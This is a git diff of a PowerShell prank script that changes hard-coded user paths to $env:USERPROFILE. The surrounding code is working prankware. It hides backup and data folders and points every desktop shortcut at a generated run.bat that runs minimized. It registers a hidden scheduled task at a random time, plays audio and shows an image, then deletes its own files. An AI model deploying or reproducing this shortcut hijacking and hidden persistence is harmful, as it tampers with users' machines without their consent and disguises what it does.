@@ -26,44 +26,44 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
     # Get the links on the Desktop
     $links = @()
 
-    if ((Test-Path "C:\Users\$($env:USERNAME)\Desktop")) {$links+=dir "C:\Users\$($env:USERNAME)\Desktop\*.lnk"}
-    if ((Test-Path "C:\Users\$($env:USERNAME)\OneDrive\Desktop")){$links+=dir "C:\Users\$($env:USERNAME)\OneDrive\Desktop\*.lnk"}
+    if ((Test-Path "$env:USERPROFILE\Desktop")) {$links+=dir "$env:USERPROFILE\Desktop\*.lnk"}
+    if ((Test-Path "$env:USERPROFILE\OneDrive\Desktop")){$links+=dir "$env:USERPROFILE\OneDrive\Desktop\*.lnk"}
 
     # If we got at least one link...
     if($links.Count -ge 1){
         
         # Backup the links
-        New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Backup" -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        New-Item -ItemType Directory "$env:USERPROFILE\Backup" -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "$env:USERPROFILE\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
         $i=0
 
         foreach ($link in $links) {
-            if (!(Test-Path "C:\Users\$($env:USERNAME)\Backup\$i\$($link.Name)")) {
-                New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Backup\$i" -ErrorAction SilentlyContinue
-                Copy-Item $link.FullName "C:\Users\$($env:USERNAME)\Backup\$i" -ErrorAction SilentlyContinue
-                "$i;$($link.FullName)" | Out-File -Append "C:\Users\$($env:USERNAME)\Backup\links.db" -Encoding ascii
+            if (!(Test-Path "$env:USERPROFILE\Backup\$i\$($link.Name)")) {
+                New-Item -ItemType Directory "$env:USERPROFILE\Backup\$i" -ErrorAction SilentlyContinue
+                Copy-Item $link.FullName "$env:USERPROFILE\Backup\$i" -ErrorAction SilentlyContinue
+                "$i;$($link.FullName)" | Out-File -Append "$env:USERPROFILE\Backup\links.db" -Encoding ascii
                 $i++
             }
         }
 
         # Install the script
-        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data")) {
-            New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data" -ErrorAction SilentlyContinue
-            Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        if (!(Test-Path "$env:USERPROFILE\Data")) {
+            New-Item -ItemType Directory "$env:USERPROFILE\Data" -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path "$env:USERPROFILE\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
         }
-        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\image.png") -or !(Test-Path "C:\Users\$($env:USERNAME)\Data\audio.wav")) {
-            Expand-Archive -Path ".\src\data.zip" -DestinationPath "C:\Users\$($env:USERNAME)\Data\"
+        if (!(Test-Path "$env:USERPROFILE\Data\image.png") -or !(Test-Path "$env:USERPROFILE\Data\audio.wav")) {
+            Expand-Archive -Path ".\src\data.zip" -DestinationPath "$env:USERPROFILE\Data\"
         }
-        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1")) {
-            Copy-Item ".\MEGA_links.ps1" "C:\Users\$($env:USERNAME)\Data\"
+        if (!(Test-Path "$env:USERPROFILE\Data\MEGA_links.ps1")) {
+            Copy-Item ".\MEGA_links.ps1" "$env:USERPROFILE\Data\"
         }
-        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\src\data.zip")) {
-            New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data\src" -ErrorAction SilentlyContinue
-            Copy-Item ".\src\data.zip" "C:\Users\$($env:USERNAME)\Data\src"
+        if (!(Test-Path "$env:USERPROFILE\Data\src\data.zip")) {
+            New-Item -ItemType Directory "$env:USERPROFILE\Data\src" -ErrorAction SilentlyContinue
+            Copy-Item ".\src\data.zip" "$env:USERPROFILE\Data\src"
         }
-        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\save_him_from_hell.bat")) {
-            Copy-Item ".\save_him_from_hell.bat" "C:\Users\$($env:USERNAME)\Data\"
+        if (!(Test-Path "$env:USERPROFILE\Data\save_him_from_hell.bat")) {
+            Copy-Item ".\save_him_from_hell.bat" "$env:USERPROFILE\Data\"
         }
 
         # Setup the mode
@@ -72,17 +72,17 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 @"
 @echo off
 
-Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "save_him_from_hell"
+Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"
 
-Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
+Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
 
-del /f /q "C:\Users\$($env:USERNAME)\Data\image.png"
-del /f /q "C:\Users\$($env:USERNAME)\Data\audio.wav"
+del /f /q "$env:USERPROFILE\Data\image.png"
+del /f /q "$env:USERPROFILE\Data\audio.wav"
 
 timeout /t 5 >nul
 del /f /q "%~f0"
 
-"@ | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding ascii
 
         }
 
@@ -92,17 +92,17 @@ del /f /q "%~f0"
 @"
 @echo off
 
-Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "save_him_from_hell"
+Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"
 
-"C:\Users\$($env:USERNAME)\Data\image.png"
+"$env:USERPROFILE\Data\image.png"
 
-del /f /q "C:\Users\$($env:USERNAME)\Data\image.png"
-del /f /q "C:\Users\$($env:USERNAME)\Data\audio.wav"
+del /f /q "$env:USERPROFILE\Data\image.png"
+del /f /q "$env:USERPROFILE\Data\audio.wav"
 
 timeout /t 5 >nul
 del /f /q "%~f0"
 
-"@ | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding ascii
 
         }
 
@@ -112,11 +112,11 @@ del /f /q "%~f0"
 @"
 @echo off
 
-Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
+Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
 
-Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
+Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
 
-"@ | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding ascii
 
         }
 
@@ -127,7 +127,7 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
         foreach ($link in $links) {
             $shortcut = $WshShell.CreateShortcut($link.FullName)
 
-            $shortcut.TargetPath = "C:\Users\$($env:USERNAME)\Data\run.bat"
+            $shortcut.TargetPath = "$env:USERPROFILE\Data\run.bat"
             $shortcut.WindowStyle = 7
 
             $shortcut.Save()
@@ -139,27 +139,27 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
 } elseif ($mode -eq "save_him_from_hell"){
     
     # Log the recovery (in case you get an error)
-    Start-Transcript "C:\Users\$($env:USERNAME)\Backup\Data_Recovery.log" -Append
+    Start-Transcript "$env:USERPROFILE\Backup\Data_Recovery.log" -Append
 
     # Restore where the links were
     $data = @{}
 
-    foreach ($raw in Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db") {
+    foreach ($raw in Get-Content "$env:USERPROFILE\Backup\links.db") {
         $parts = $raw.Split(";",2)
         $data[$parts[0]] = $parts[1]
     }
 
     foreach ($id in $data.Keys) {
-        Move-Item "C:\Users\$($env:USERNAME)\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
+        Move-Item "$env:USERPROFILE\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
     }
 
-    Remove-Item "C:\Users\$($env:USERNAME)\Backup\links.db"
-    Remove-Item "C:\Users\$($env:USERNAME)\Data\save_him_from_hell.bat"
-    Remove-Item "C:\Users\$($env:USERNAME)\Data\src\data.zip"
-    Remove-Item "C:\Users\$($env:USERNAME)\Data\src"
+    Remove-Item "$env:USERPROFILE\Backup\links.db"
+    Remove-Item "$env:USERPROFILE\Data\save_him_from_hell.bat"
+    Remove-Item "$env:USERPROFILE\Data\src\data.zip"
+    Remove-Item "$env:USERPROFILE\Data\src"
 
     foreach ($id in $data.Keys){
-        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$id"
+        Remove-Item "$env:USERPROFILE\Backup\$id"
     }
 
     # Check if the scheduled task is installed, if it is delete it
@@ -170,7 +170,7 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
     }
 
     # Delete the script
-    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`"" -WindowStyle Hidden
+    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\MEGA_links.ps1`"" -WindowStyle Hidden
 
     # stop logging
     Stop-Transcript
@@ -180,24 +180,24 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
 } elseif ($mode -eq "ah_shit..._here_we_go_again") {
     
     # Log the recovery (in case you get an error)
-    Start-Transcript "C:\Users\$($env:USERNAME)\Backup\Data_Recovery.log" -Append
+    Start-Transcript "$env:USERPROFILE\Backup\Data_Recovery.log" -Append
 
     # Restore where the links were
     $data = @{}
 
-    foreach ($raw in Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db") {
+    foreach ($raw in Get-Content "$env:USERPROFILE\Backup\links.db") {
         $parts = $raw.Split(";",2)
         $data[$parts[0]] = $parts[1]
     }
 
     foreach ($id in $data.Keys) {
-        Move-Item "C:\Users\$($env:USERNAME)\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
+        Move-Item "$env:USERPROFILE\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
     }
 
-    Remove-Item "C:\Users\$($env:USERNAME)\Backup\links.db"
+    Remove-Item "$env:USERPROFILE\Backup\links.db"
 
     foreach ($id in $data.Keys){
-        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$id"
+        Remove-Item "$env:USERPROFILE\Backup\$id"
     }
 
     # Stop logging
@@ -217,7 +217,7 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
     # Set the action of the task
     $action = New-ScheduledTaskAction `
         -Execute "powershell.exe" `
-        -Argument "-NoProfile -WindowStyle Hidden -File `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
+        -Argument "-NoProfile -WindowStyle Hidden -File `"$env:USERPROFILE\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
 
     # Set the date/time execution of the task
     $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime
@@ -248,7 +248,7 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
 } elseif ($mode -eq "get_shrekt") {
     
     # Get the audio
-    $audioPath = "C:\Users\$($env:USERNAME)\Data\audio.wav"
+    $audioPath = "$env:USERPROFILE\Data\audio.wav"
 
     $player = New-Object System.Media.SoundPlayer
     $player.SoundLocation = $audioPath
@@ -267,7 +267,7 @@ Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
 
     $image = New-Object Windows.Controls.Image
     $image.Source = [Windows.Media.Imaging.BitmapImage]::new(
-        [Uri]"C:\Users\$($env:USERNAME)\Data\image.png"
+        [Uri]"$env:USERPROFILE\Data\image.png"
     )
     $image.Stretch = 'Uniform'
 
